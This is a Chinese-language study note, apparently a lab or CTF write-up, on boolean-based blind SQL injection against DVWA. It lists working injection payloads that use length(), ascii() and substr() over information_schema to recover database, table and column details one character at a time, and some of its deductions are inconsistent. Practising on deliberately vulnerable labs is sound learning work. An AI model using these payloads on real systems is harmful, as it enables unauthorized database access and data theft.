>[!note] 参考文章
> [https://www.yijinglab.com/specialized/20210203103111](https://www.yijinglab.com/specialized/20210203103111)
> [https://xz.aliyun.com/t/6595?time__1311=n4%2BxnD0Dg7i%3D3BKG%3DDODlhjeYZGDBD8YxQwmID](https://xz.aliyun.com/t/6595?time__1311=n4%2BxnD0Dg7i%3D3BKG%3DDODlhjeYZGDBD8YxQwmID)

>[!hint]
>
>DVWA 参考 https://www.cnblogs.com/escwq/p/12498925.html
### 文字叙述一下 dvwa 中的盲注题

##### Low Difficulty
Try
``` sql
1 or 1=1
```
发现回显了 true，应该是没做过滤

>[!note] 一些关键的函数，有可能通过表名查数据库吗#
>- ascii ()
>- length ()
>- substr ()

> 用法：substr(string string,num start,num length);
> select  substr(参数1，参数2，参数3)  from  表名  
> string为字符串；start为起始位置；length为长度。
> 注意：mysql中的start是从1开始的。
> 例子:(查出kename字段中第一次出现.之前的字符串)


### 解题


#### 数据库
- 数据库名长度
``` sql
 1 and length(database())=4 #      //数据库名长度为4
```
- 猜数据库名
- 第一个是 115-s
- 第二个是 113-q
- 猜测是 sqli
``` sql
1 and ascii(substr(database(),1,1))=`ASCII_CODE` #
```
![image.png](https://raw.githubusercontent.com/MarchPhantasia/pic/main/hexoblog/20240720135153.png)

#### 表
- 表名长度长度为 4 直接猜是 flag 吧
```sql
select * from news where id=1 or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=4) #
```

- 猜表名
``` sql
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>32)--+正常
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>128)--+不回显
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80)--+正常
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>104)--+正常
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>116)--+正常
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>122)--+不回显
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>119)--+不回显
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>119)--+不回显
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>118)--+不回显
" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>117)--+不回显
```

#### 字段
- 字段长
``` sql
" or (length((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 0,1))=2)--+正常

" or (length((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 1,1))=8)--+正常

" or (length((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 2,1))=8)--+正常
```
- 所以user_2表的数据字段长度分别为2、8、8